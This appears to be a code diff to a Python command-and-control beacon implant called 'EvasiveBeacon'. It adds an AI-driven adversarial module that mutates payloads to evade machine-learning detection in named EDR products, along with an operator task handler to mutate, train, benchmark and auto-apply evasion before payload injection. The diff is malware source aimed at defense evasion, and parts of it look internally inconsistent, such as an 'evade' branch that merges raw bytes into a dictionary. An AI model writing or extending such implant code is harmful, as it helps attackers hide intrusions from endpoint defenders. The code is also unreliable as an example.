@@ -210,6 +210,29 @@ except ImportError:
     EncryptionMode = None
     print("[!] Quantum cryptography not available")
 
+# NEW: Import AI Adversarial Training for EDR ML evasion
+try:
+    from evasion.ai_adversarial import (
+        AIAdversarialTrainer,
+        AdversarialConfig,
+        AdversarialResult,
+        EDRVendor,
+        AttackMethod,
+        FeatureExtractor,
+        GANMutator,
+        NeuralEDRModel,
+        create_adversarial_trainer,
+        quick_evade,
+    )
+    AI_ADVERSARIAL_AVAILABLE = True
+except ImportError:
+    AI_ADVERSARIAL_AVAILABLE = False
+    AIAdversarialTrainer = None
+    AdversarialConfig = None
+    EDRVendor = None
+    AttackMethod = None
+    print("[!] AI Adversarial training not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -248,6 +271,13 @@ class BeaconConfig:
     syscall_use_fresh_ssn: bool = True
     syscall_enable_spoof: bool = True
     syscall_junk_ratio: float = 0.5
+    # NEW: AI Adversarial training settings
+    enable_ai_adversarial: bool = True
+    ai_adversarial_level: str = "high"  # low, medium, high, paranoid
+    ai_target_edr: str = "sentinelone"  # sentinelone, crowdstrike, defender, carbon_black, cylance, generic
+    ai_attack_method: str = "gan"  # gan, fgsm, pgd, cw, deepfool, genetic
+    ai_confidence_threshold: float = 0.3
+    ai_auto_apply: bool = True  # Auto-apply adversarial mutations to payloads
     # NEW: Persistence god mode settings
     enable_persistence_god: bool = True
     persistence_chain: str = "ai_select"  # ai_select, bits_job, com_hijack, runkey, full_chain, etc.
@@ -368,6 +398,11 @@ class EvasiveBeacon:
         if QUANTUM_CRYPTO_AVAILABLE and config.enable_quantum_crypto:
             self._init_quantum_crypto()
         
+        # NEW: Initialize AI Adversarial Training for EDR ML evasion
+        self.ai_adversarial = None
+        if AI_ADVERSARIAL_AVAILABLE and config.enable_ai_adversarial:
+            self._init_ai_adversarial()
+        
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
             "cmd": self._handle_cmd,
@@ -383,6 +418,7 @@ class EvasiveBeacon:
             "report": self._handle_report,  # NEW: Report generation handler
             "mimicry": self._handle_mimicry,  # NEW: Behavioral mimicry handler
             "quantum": self._handle_quantum,  # NEW: Quantum crypto handler
+            "adversarial": self._handle_adversarial,  # NEW: AI adversarial handler
             "exit": self._handle_exit,
         }
         
@@ -748,6 +784,94 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize quantum crypto: {e}")
             self.quantum_crypto = None
+    
+    def _init_ai_adversarial(self):
+        """Initialize AI Adversarial Training for EDR ML evasion"""
+        if not AI_ADVERSARIAL_AVAILABLE:
+            return
+        
+        try:
+            # Map target EDR string to enum
+            edr_map = {
+                'sentinelone': EDRVendor.SENTINELONE,
+                'crowdstrike': EDRVendor.CROWDSTRIKE,
+                'defender': EDRVendor.DEFENDER,
+                'carbon_black': EDRVendor.CARBON_BLACK,
+                'cylance': EDRVendor.CYLANCE,
+                'generic': EDRVendor.GENERIC,
+            }
+            target_edr = edr_map.get(
+                self.config.ai_target_edr.lower(),
+                EDRVendor.GENERIC
+            )
+            
+            # Map attack method
+            method_map = {
+                'gan': AttackMethod.GAN,
+                'fgsm': AttackMethod.FGSM,
+                'pgd': AttackMethod.PGD,
+                'cw': AttackMethod.CW,
+                'deepfool': AttackMethod.DEEPFOOL,
+                'genetic': AttackMethod.GENETIC,
+            }
+            attack_method = method_map.get(
+                self.config.ai_attack_method.lower(),
+                AttackMethod.GAN
+            )
+            
+            # Create config
+            config = AdversarialConfig(
+                evasion_level=self.config.ai_adversarial_level,
+                target_edr=target_edr,
+                attack_method=attack_method,
+                confidence_threshold=self.config.ai_confidence_threshold,
+            )
+            
+            # Create trainer
+            self.ai_adversarial = AIAdversarialTrainer(config=config)
+            
+            print(f"[+] 🧠 AI Adversarial Training initialized:")
+            print(f"    Target EDR: {self.config.ai_target_edr.upper()}")
+            print(f"    Attack method: {self.config.ai_attack_method.upper()}")
+            print(f"    Evasion level: {self.config.ai_adversarial_level}")
+            print(f"    Confidence threshold: {self.config.ai_confidence_threshold}")
+            print(f"    Auto-apply: {self.config.ai_auto_apply}")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize AI adversarial: {e}")
+            self.ai_adversarial = None
+    
+    def apply_adversarial_evasion(self, payload: bytes) -> bytes:
+        """
+        Apply AI adversarial mutations to payload for EDR ML evasion.
+        This should be called before payload execution/injection.
+        
+        Args:
+            payload: Original payload bytes
+            
+        Returns:
+            Adversarially mutated payload
+        """
+        if not self.ai_adversarial or not self.config.ai_auto_apply:
+            return payload
+        
+        try:
+            result = self.ai_adversarial.train_adversarial(payload)
+            
+            if result.evasion_success:
+                print(f"[+] 🎯 AI Adversarial evasion SUCCESS:")
+                print(f"    Score: {result.original_score:.2%} → {result.adversarial_score:.2%}")
+                print(f"    Mutations: {', '.join(result.mutations_applied)}")
+                return result.adversarial_payload
+            else:
+                print(f"[!] AI Adversarial evasion partial:")
+                print(f"    Score: {result.original_score:.2%} → {result.adversarial_score:.2%}")
+                # Return mutated anyway, may still help
+                return result.adversarial_payload
+                
+        except Exception as e:
+            print(f"[!] AI adversarial evasion failed: {e}")
+            return payload
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -1960,6 +2084,204 @@ class EvasiveBeacon:
                 success=result["success"],
                 edr_bypass=1.0 if result["success"] else 0.0,
                 details={"action": action, "mode": result.get("mode", "")},
+            )
+            
+        except Exception as e:
+            result["error"] = str(e)
+        
+        return result
+    
+    def _handle_adversarial(self, task: Dict) -> Dict:
+        """
+        AI Adversarial payload mutation for EDR ML evasion.
+        
+        Task params:
+            action: mutate, train, status, benchmark, evade, analyze
+            payload: Payload data (base64 encoded) for mutation
+            target_edr: Target EDR vendor (sentinelone, crowdstrike, defender, etc.)
+            attack_method: Attack method (fgsm, pgd, cw, deepfool, gan, genetic)
+            confidence_target: Target confidence threshold (0.0-1.0)
+            iterations: Number of mutation iterations
+            auto_apply: Whether to automatically apply best mutation
+        """
+        result = {
+            "success": False,
+            "action": "",
+            "original_detection": 0.0,
+            "evaded_detection": 0.0,
+            "improvement": 0.0,
+            "mutations_applied": [],
+            "edr_target": "",
+            "attack_method": "",
+            "error": None,
+        }
+        
+        if not AI_ADVERSARIAL_AVAILABLE:
+            result["error"] = "AI Adversarial module not available"
+            return result
+        
+        try:
+            params = task.get("params", {})
+            action = params.get("action", "status")
+            
+            if action == "status":
+                # Return AI adversarial system status
+                if self.ai_adversarial:
+                    stats = self.ai_adversarial.get_stats()
+                    result["success"] = True
+                    result["action"] = "status"
+                    result["stats"] = stats
+                    result["edr_target"] = self.config.ai_target_edr
+                    result["attack_method"] = self.config.ai_attack_method
+                    result["confidence_threshold"] = self.config.ai_confidence_threshold
+                else:
+                    result["error"] = "AI Adversarial trainer not initialized"
+                    
+            elif action == "mutate":
+                # Mutate a payload to evade EDR detection
+                if not self.ai_adversarial:
+                    self._init_ai_adversarial()
+                
+                if self.ai_adversarial:
+                    payload_b64 = params.get("payload", "")
+                    if not payload_b64:
+                        result["error"] = "No payload provided"
+                        return result
+                    
+                    payload = base64.b64decode(payload_b64)
+                    target_edr = params.get("target_edr", self.config.ai_target_edr)
+                    confidence_target = params.get("confidence_target", self.config.ai_confidence_threshold)
+                    
+                    # Run adversarial mutation
+                    adv_result = self.ai_adversarial.evade_edr(
+                        payload=payload,
+                        target_edr=target_edr,
+                        confidence_target=confidence_target,
+                        max_iterations=params.get("iterations", 100)
+                    )
+                    
+                    result["success"] = adv_result.success
+                    result["action"] = "mutate"
+                    result["original_detection"] = adv_result.original_confidence
+                    result["evaded_detection"] = adv_result.final_confidence
+                    result["improvement"] = adv_result.original_confidence - adv_result.final_confidence
+                    result["mutations_applied"] = adv_result.mutations_applied
+                    result["edr_target"] = target_edr
+                    result["iterations"] = adv_result.iterations
+                    
+                    if adv_result.success:
+                        result["mutated_payload"] = base64.b64encode(adv_result.mutated_payload).decode()
+                else:
+                    result["error"] = "Failed to initialize AI Adversarial trainer"
+                    
+            elif action == "train":
+                # Train the adversarial model on samples
+                if not self.ai_adversarial:
+                    self._init_ai_adversarial()
+                    
+                if self.ai_adversarial:
+                    samples_b64 = params.get("samples", [])
+                    samples = [base64.b64decode(s) for s in samples_b64]
+                    epochs = params.get("epochs", 50)
+                    
+                    train_result = self.ai_adversarial.train(
+                        benign_samples=samples,
+                        epochs=epochs
+                    )
+                    
+                    result["success"] = True
+                    result["action"] = "train"
+                    result["epochs_trained"] = epochs
+                    result["training_loss"] = train_result.get("final_loss", 0.0)
+                    result["generator_loss"] = train_result.get("generator_loss", 0.0)
+                    result["discriminator_loss"] = train_result.get("discriminator_loss", 0.0)
+                else:
+                    result["error"] = "Failed to initialize AI Adversarial trainer"
+                    
+            elif action == "benchmark":
+                # Benchmark against multiple EDRs
+                if not self.ai_adversarial:
+                    self._init_ai_adversarial()
+                    
+                if self.ai_adversarial:
+                    payload_b64 = params.get("payload", "")
+                    if not payload_b64:
+                        result["error"] = "No payload provided"
+                        return result
+                    
+                    payload = base64.b64decode(payload_b64)
+                    edrs = params.get("target_edrs", ["sentinelone", "crowdstrike", "defender", "cylance"])
+                    
+                    benchmark_results = {}
+                    for edr in edrs:
+                        edr_result = self.ai_adversarial.evade_edr(
+                            payload=payload,
+                            target_edr=edr,
+                            confidence_target=0.1,
+                            max_iterations=50
+                        )
+                        benchmark_results[edr] = {
+                            "original_detection": edr_result.original_confidence,
+                            "evaded_detection": edr_result.final_confidence,
+                            "success": edr_result.success,
+                            "iterations": edr_result.iterations
+                        }
+                    
+                    result["success"] = True
+                    result["action"] = "benchmark"
+                    result["benchmark_results"] = benchmark_results
+                    result["avg_improvement"] = sum(
+                        r["original_detection"] - r["evaded_detection"] 
+                        for r in benchmark_results.values()
+                    ) / len(benchmark_results)
+                else:
+                    result["error"] = "Failed to initialize AI Adversarial trainer"
+                    
+            elif action == "analyze":
+                # Analyze payload features and detection likelihood
+                if not self.ai_adversarial:
+                    self._init_ai_adversarial()
+                    
+                if self.ai_adversarial:
+                    payload_b64 = params.get("payload", "")
+                    if not payload_b64:
+                        result["error"] = "No payload provided"
+                        return result
+                    
+                    payload = base64.b64decode(payload_b64)
+                    analysis = self.ai_adversarial.analyze_payload(payload)
+                    
+                    result["success"] = True
+                    result["action"] = "analyze"
+                    result["feature_analysis"] = analysis.get("features", {})
+                    result["detection_likelihood"] = analysis.get("detection_likelihood", {})
+                    result["recommended_mutations"] = analysis.get("recommended_mutations", [])
+                    result["risk_score"] = analysis.get("risk_score", 0.0)
+                else:
+                    result["error"] = "Failed to initialize AI Adversarial trainer"
+                    
+            elif action == "evade":
+                # Quick evasion using pre-configured settings
+                evade_result = self.apply_adversarial_evasion(
+                    base64.b64decode(params.get("payload", ""))
+                )
+                result.update(evade_result)
+                result["action"] = "evade"
+                
+            else:
+                result["error"] = f"Unknown action: {action}"
+            
+            # Log adversarial action
+            self._log_chain_entry(
+                technique="ai_adversarial_evasion",
+                tactic="defense_evasion",
+                success=result["success"],
+                edr_bypass=result.get("improvement", 0.0),
+                details={
+                    "action": action,
+                    "edr_target": result.get("edr_target", ""),
+                    "improvement": result.get("improvement", 0.0)
+                },
             )
             
         except Exception as e:
